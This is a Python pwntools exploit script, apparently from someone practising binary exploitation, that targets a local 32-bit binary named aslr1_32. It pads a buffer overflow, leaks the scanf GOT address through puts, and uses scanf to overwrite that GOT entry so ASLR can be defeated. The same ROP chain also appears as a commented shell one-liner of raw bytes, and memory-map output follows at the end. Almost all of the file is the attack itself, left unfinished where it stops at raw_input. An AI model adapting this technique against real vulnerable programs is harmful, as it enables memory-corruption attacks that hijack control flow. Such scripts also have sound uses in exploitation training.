from pwn import *

elf = ELF("./aslr1_32")
p = process("./aslr1_32")

pop_pop_ret = 0x804925a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8049050
puts_plt = 0x8049030
puts_got = 0x804c00c
string_fmt = 0x804a021      # "%s"
scanf_got = 0x804c014


payload  = "A"*40           # buf padding
payload += p32(puts_plt)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)

#r <<< $(python -c 'print "A"*40+"\x30\x90\x04\x08"+"\x5b\92\x04\x08"+"\x14\xc0\x04\x08"+"\x50\x90\x04\x08"+"\x5a\x92\x04\x08"+"\x21\xa0\x04\x08"+"\x14\xc0\x04\x08"+"\x50\x90\x04\x08"+"\xef\xbe\xad\xde"+"\x18\xc0\x04\x08"')

print `payload`

print p.recvuntil("!")
print p.recvuntil("!")

p.sendlineafter("",payload)

raw_input("$ ")




0x0804c000 0x0804d000 rw-p      /root/binExploit/ASLR/aslr1_32
0xfffdd000 0xffffe000 rw-p      [stack]